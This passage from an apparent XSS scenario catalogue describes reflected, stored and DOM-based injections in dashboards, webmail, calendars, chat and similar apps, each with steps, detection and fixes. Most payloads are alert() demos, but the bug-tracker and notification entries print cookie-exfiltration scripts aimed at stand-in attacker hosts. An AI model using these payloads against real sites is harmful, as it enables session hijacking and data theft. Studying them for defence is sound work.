- **Attack Type**: DOM-Based XSS
- **Target**: Analytics Dashboards / Reports
- **Vulnerability**: Query string written to DOM directly
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Internal dashboard compromise
- **Tools**: XSStrike, DevTools
- **Scenario**: URL filter values are inserted into the page with innerHTML during load.
- **Attack Steps**: 1. Analytics page uses query params like ?filter=month. 2. Attacker sends ?filter=<img src=x onerror=alert('analytics')>. 3. JS inserts filter directly into a header element using innerHTML. 4. The script executes when page loads, without server interaction.
- **Detection**: Audit query param usage in dashboards
- **Solution**: Replace innerHTML with textContent
- **Tags**: #domxss #analyticsxss #filterinject

## Mixed XSS in Comment and Avatar Rendering

- **Attack Type**: Stored + DOM-Based XSS
- **Target**: Comments with Avatars / User Icons
- **Vulnerability**: Unfiltered avatar URL + DOM rendering
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Drive-by execution via image loads
- **Tools**: Burp Suite, XSS Hunter
- **Scenario**: Avatar URL is stored with payload, then inserted via DOM API.
- **Attack Steps**: 1. Attacker uploads a comment with avatar URL: javascript:alert('avatar'). 2. The app stores the URL in DB and later injects it into src via DOM like img.src = data.avatar. 3. Since the protocol is javascript:, it executes the payload. 4. The attack combines persistence with DOM injection.
- **Detection**: Inspect image protocols and dynamic DOM setters
- **Solution**: Disallow javascript: URIs in all inputs
- **Tags**: #storedxss #domxss #avatarbug

## Stored XSS via Email Signature

- **Attack Type**: Stored XSS
- **Target**: Webmail / Email Clients
- **Vulnerability**: Unsanitized HTML in signatures
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Compromise via reading email only
- **Tools**: Email Client, XSS Hunter
- **Scenario**: Email signature with script tag is rendered inside email preview in inbox.
- **Attack Steps**: 1. Attacker adds email signature: <script>alert('sig')</script>. 2. When the victim receives email and opens preview, the script runs. 3. Works on webmail services that render HTML but don’t sanitize signature blocks.
- **Detection**: Analyze email preview rendering logic
- **Solution**: Strip all tags from HTML signatures
- **Tags**: #emailxss #storedxss #signaturescript

## Reflected XSS via Chat Invite Link

- **Attack Type**: Reflected XSS
- **Target**: Chat Widgets / Invite Pages
- **Vulnerability**: Parameter reflected into dialog HTML
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Phishing via fake chat rooms
- **Tools**: Firefox DevTools, Burp Suite
- **Scenario**: Chat invite form includes unfiltered name param in confirmation dialog.
- **Attack Steps**: 1. Invite link: /invite?name=<script>alert('chat')</script>. 2. Confirmation page reflects name inside greeting message. 3. Payload executes upon loading page. 4. Exploitable via social invites or embed widgets.
- **Detection**: Detect HTML tags in GET parameters
- **Solution**: Use template rendering with auto-escaping
- **Tags**: #chatxss #reflectedxss #invitehack

## DOM-Based XSS via Cookie Value Injection

- **Attack Type**: DOM-Based XSS
- **Target**: Frontend Personalization Widgets
- **Vulnerability**: Insecure DOM injection from cookies
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Persistent XSS across visits
- **Tools**: Chrome DevTools, XSStrike
- **Scenario**: JavaScript reads cookie and inserts it using innerHTML into UI.
- **Attack Steps**: 1. App uses document.cookie to show welcome message. 2. If cookie includes: user=<img src=x onerror=alert('cookie')>, it’s inserted directly. 3. Script runs on page load without sanitization. 4. Can happen due to earlier XSS setting the cookie.
- **Detection**: Review all DOM sinks using cookie data
- **Solution**: Sanitize cookie values before rendering
- **Tags**: #cookiexss #domxss #persistenceattack

## Stored XSS via Poll Answer Option

- **Attack Type**: Stored XSS
- **Target**: Polling or Voting Modules
- **Vulnerability**: Script stored in poll labels
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Stealth script triggered in voting interfaces
- **Tools**: Burp Suite, XSS Hunter
- **Scenario**: Poll answer fields store script which triggers when results are shown.
- **Attack Steps**: 1. Attacker submits an option: Vote for <script>alert('Poll')</script>. 2. The app stores and displays the option in poll results. 3. Any user viewing results sees the script execute. 4. Often overlooked due to non-obvious input field.
- **Detection**: Scan results rendering for unsafe inputs
- **Solution**: Escape all dynamic poll content
- **Tags**: #pollxss #storedxss #voteexploit

## Stored XSS in Public Bug Tracker Comments

- **Attack Type**: Stored XSS
- **Target**: Developer Platforms / Bug Trackers
- **Vulnerability**: Unescaped comment fields rendered into HTML
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Developer session hijack, internal tool compromise
- **Tools**: Burp Suite, XSS Hunter
- **Scenario**: Attacker injects malicious JS in bug report comment field; script executes when developers view the report.
- **Attack Steps**: 1. Attacker signs up on a public bug tracker (e.g., GitLab, Jira, Redmine). 2. They create a new bug report with a realistic issue title and body to avoid suspicion. 3. In the “Additional Comments” or “Reproduction Steps” section, they inject a script payload like: <script>fetch('https://attacker.site/steal?cookie='+document.cookie)</script>. 4. The comment is saved into the backend and displayed as-is in the web UI when anyone views the bug. 5. A developer or admin who opens the report unknowingly executes the payload in their browser. 6. The script silently sends session cookies or tokens to the attacker's server. 7. Because it runs in a trusted domain (dev portal), this may allow privilege escalation. 8. Attackers may chain this with CSRF or API token theft to further pivot within the infrastructure.
- **Detection**: Monitor comment fields for executable content; flag unexpected script tags
- **Solution**: Escape user input on rendering; implement CSP headers
- **Tags**: #bugtrackerxss #devtoolsattack #storedxss

## Reflected XSS in Document Viewer Query Parameters

- **Attack Type**: Reflected XSS
- **Target**: File Viewers / Web-based Office Apps
- **Vulnerability**: Unescaped query params rendered into HTML
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Credential theft, popup phishing
- **Tools**: Firefox DevTools, Burp Suite
- **Scenario**: Attacker injects script via document title parameter; it is reflected back into HTML when opening a file.
- **Attack Steps**: 1. Web document viewer uses URLs like /viewer?title=QuarterlyReport. 2. The app reflects this title back into the webpage like <h1>Your document: QuarterlyReport</h1>. 3. Attacker crafts a malicious link: viewer?title=<script>alert("xss")</script>. 4. When the victim opens the link, the script executes immediately in the browser. 5. Common in online previewers, file explorers, or document management portals. 6. The attack is highly effective in phishing, as the victim may believe it's a secure viewer. 7. More advanced variants use onerror or obfuscated payloads to evade filters. 8. Reflected XSS from query strings often bypass basic content filtering mechanisms.
- **Detection**: Test query reflection by injecting HTML special characters
- **Solution**: Encode parameters, use context-aware escaping
- **Tags**: #viewerxss #reflectedxss #phishingvector

## DOM-Based XSS via Unsafe InnerHTML in Cookie Consent

- **Attack Type**: DOM-Based XSS
- **Target**: Frontend Consent Tools
- **Vulnerability**: Client-side rendering of unsanitized storage values
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Persistent local injection, WAF evasion
- **Tools**: XSStrike, Browser Console
- **Scenario**: Cookie banner uses innerHTML to display custom messages stored in browser storage; attacker exploits via tampered localStorage.
- **Attack Steps**: 1. Site uses a script like document.getElementById('cookie-banner').innerHTML = localStorage.getItem('cookieMessage');. 2. Attacker finds this behavior by inspecting the script in DevTools. 3. They manually inject a malicious payload into localStorage using browser console: localStorage.setItem('cookieMessage', '<img src=x onerror=alert("cookiexss")>');. 4. On the next reload, the browser executes the injected payload due to unsafe innerHTML assignment. 5. Since this happens entirely client-side, it evades traditional server-side WAF or logging. 6. The attacker could trick the victim into running this code via a malicious extension or earlier XSS. 7. This vulnerability persists until localStorage is cleared or fixed in code. 8. It can be used to implant persistent backdoors, trigger fake modals, or silently exfiltrate tokens.
- **Detection**: Analyze JavaScript that uses storage + DOM manipulation
- **Solution**: Avoid innerHTML, use DOMPurify or set textContent
- **Tags**: #domxss #cookiebanner #localstoragehack

## Stored XSS in Notification Message Template

- **Attack Type**: Stored XSS
- **Target**: Notification or Alert Systems
- **Vulnerability**: Unescaped template rendered as innerHTML
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Notification hijack, token exfiltration
- **Tools**: XSS Hunter, Burp Suite
- **Scenario**: Web platform stores custom notification messages per user and renders them without sanitization.
- **Attack Steps**: 1. Web app allows users or admins to define notification messages shown to other users. 2. Attacker sets their notification to include a payload like <script>document.location='http://evil.site?c='+document.cookie</script>. 3. This message is saved in the backend and is displayed to other users on login or interaction. 4. When any victim receives the notification, the browser executes the script in their session context. 5. Common in internal dashboards, helpdesk portals, or HR software. 6. The attacker may also hide the payload inside HTML attributes or encode it to bypass WAFs. 7. The script may trigger silently or run on a timer to avoid detection. 8. With creative placement, attackers can make the notification look legitimate while exploiting users silently.
- **Detection**: Analyze stored templates and how they are inserted into DOM
- **Solution**: Enforce sanitization on all user-defined messages
- **Tags**: #storedxss #templatingxss #notificationhack

## Reflected XSS in Help Page Search

- **Attack Type**: Reflected XSS
- **Target**: Support Portals / Docs
- **Vulnerability**: Reflected query parameter in HTML
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Fake support page phishing
- **Tools**: ZAP, Firefox DevTools
- **Scenario**: Help page search form reflects user query in results header using unsafe rendering.
- **Attack Steps**: 1. Help center allows search queries via /help?q=login+error. 2. The results page includes user input in header: “You searched for: login error”. 3. Attacker sends link: /help?q=<script>alert("xss")</script>. 4. Page reflects it directly into DOM via template: <h2>You searched for: [query]</h2>. 5. The payload executes in the victim’s browser, bypassing input validation if special chars aren't escaped. 6. Can be used for phishing overlays or redirect scripts. 7. More sophisticated payloads may call external JS and impersonate support agents. 8. Users often trust help docs — making this a strong social engineering vector.
- **Detection**: Check if search queries reflect HTML directly
- **Solution**: Escape dynamic input and apply HTML encoding
- **Tags**: #helpcenterxss #reflectedxss #docsearchxss

## DOM-Based XSS in Dynamic Tab Loader

- **Attack Type**: DOM-Based XSS
- **Target**: Dynamic Web Portals or SPAs
- **Vulnerability**: DOM sink accepting hash content directly
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: UI spoofing, persistent tab backdoor
- **Tools**: DevTools Console, XSStrike
- **Scenario**: Tab content is loaded dynamically using fragment identifier and rendered via innerHTML without checks.
- **Attack Steps**: 1. App uses JavaScript like document.getElementById('tab-content').innerHTML = tabs[location.hash.slice(1)]. 2. Attacker crafts a URL: example.com#<img src=x onerror=alert('tabxss')>. 3. Since the fragment controls the content rendering key, the attacker injects it into the tab selector. 4. JS renders it via innerHTML, leading to direct script execution. 5. Since this all happens on the client, traditional server logs won’t record it. 6. Attackers can exploit this for tab injection, phishing, or creating fake login modals. 7. Effective on SPAs or dashboards with multiple dynamic panels. 8. Scripts can also dynamically manipulate the tab bar or execute background fetches.
- **Detection**: Check for any hash-based routing to DOM
- **Solution**: Map fragment identifiers to safe, pre-defined content
- **Tags**: #domxss #tabloaderxss #hashspoof

## Stored XSS via Event Description in Calendar App

- **Attack Type**: Stored XSS
- **Target**: Calendar Tools / Scheduling Apps
- **Vulnerability**: Unsanitized description field in calendar entry
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Session hijack, impersonation
- **Tools**: Burp Suite, XSS Hunter
- **Scenario**: Event description field is stored with embedded script and executed when the calendar renders the event card.
- **Attack Steps**: 1. Attacker creates a new calendar event with a description like <script>alert('calendar')</script>. 2. The backend stores the event and its metadata, including the description. 3. When any user views the calendar in list or card format, the payload is rendered as-is. 4. The script executes inside their browser and can be used to extract tokens or impersonate events. 5. Especially impactful on shared calendars (e.g., Google Workspace, internal enterprise apps). 6. Variants include embedding the payload in location or invitee fields. 7. The exploit can also hijack auto-reminders if those templates embed the same fields. 8. User trust in calendar systems increases the social engineering effectiveness.
- **Detection**: Inspect calendar UI rendering logic; check HTML tags
- **Solution**: Strip HTML/script from all event metadata
- **Tags**: #storedxss #calendarxss #eventspoof

## Reflected XSS in Video Embed Preview

- **Attack Type**: Reflected XSS
- **Target**: Video Embeds / Media Platforms
- **Vulnerability**: Reflected query used in DOM and title
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Phishing overlays, brand impersonation
- **Tools**: Burp Suite, Firefox DevTools
- **Scenario**: Attacker injects payload in video name that reflects into embed player preview page.
- **Attack Steps**: 1. Video embed service uses URLs like embed?video=MyVacation.mp4. 2. The name is reflected in the <title> and inside the video container. 3. Attacker crafts: embed?video=<script>alert("xss")</script>. 4. When this link is shared, the browser executes the payload on page load. 5. The attack can be disguised inside shortened links for phishing. 6. If rendered in iframe contexts, attacker may also control parent frame behavior. 7. Obfuscated payloads may be used to delay execution or evade static analysis. 8. Can be chained with autoplay or fake thumbnail links to increase click-through rate.
- **Detection**: Scan all embed URLs for HTML injection
- **Solution**: Filter special characters from parameters
- **Tags**: #videoxss #embedphishing #reflectedxss

## DOM-Based XSS via Form Autofill Loader

- **Attack Type**: DOM-Based XSS
- **Target**: Forms / Customer Onboarding
- **Vulnerability**: DOM injection from query string autofill
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Credential phishing, fake form spoofing
- **Tools**: XSStrike, Dev Console
- **Scenario**: Script dynamically populates form fields from query strings using innerHTML; attacker exploits this to inject scripts.
- **Attack Steps**: 1. Web app pre-fills fields using: document.getElementById('name').innerHTML = decodeURIComponent(location.search.slice(6)). 2. Attacker crafts URL like: site.com?name=<img src=x onerror=alert('formxss')>. 3. When user clicks the link, the form field renders the payload. 4. Unlike regular value=, this method uses innerHTML, triggering script parsing. 5. More advanced versions may trigger script chaining across multiple fields. 6. Common in form builders, landing pages, or customer registration systems.
- **Detection**: Monitor usage of dynamic form population
- **Solution**: Always use value attribute, avoid innerHTML
- **Tags**: #formxss #autofillhack #domxss

## Stored XSS via Shared Workspace Chat

- **Attack Type**: Stored XSS
- **Target**: Internal or Embedded Chat Clients
- **Vulnerability**: Message body rendered without HTML filtering
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Cross-session XSS, bot abuse, token theft
- **Tools**: XSS Hunter, DevTools
- **Scenario**: Chat system stores malicious message containing script; executes whenever chat history is loaded.
- **Attack Steps**: 1. Attacker joins a team or workspace that includes a persistent chat tool. 2. They send a message with payload like <script>alert('chatxss')</script>. 3. Chat backend stores and serves it on reload without filtering. 4. Any user who revisits the chat sees the script run in their browser. 5. Effective against internal Slack clones, open-source chat systems, or embedded helpdesk tools. 6. May be chained with emoji or markdown parsing bugs for stealth. 7. Scripts may create fake system alerts or steal API tokens from chat-integrated bots. 8. Defense is harder if markdown renderers don’t filter scripts in code blocks.
- **Detection**: Analyze how messages are rendered; check for raw HTML use
- **Solution**: Apply HTML sanitizer and disable script tags in messages
- **Tags**: #storedxss #chatxss #collaborationattack

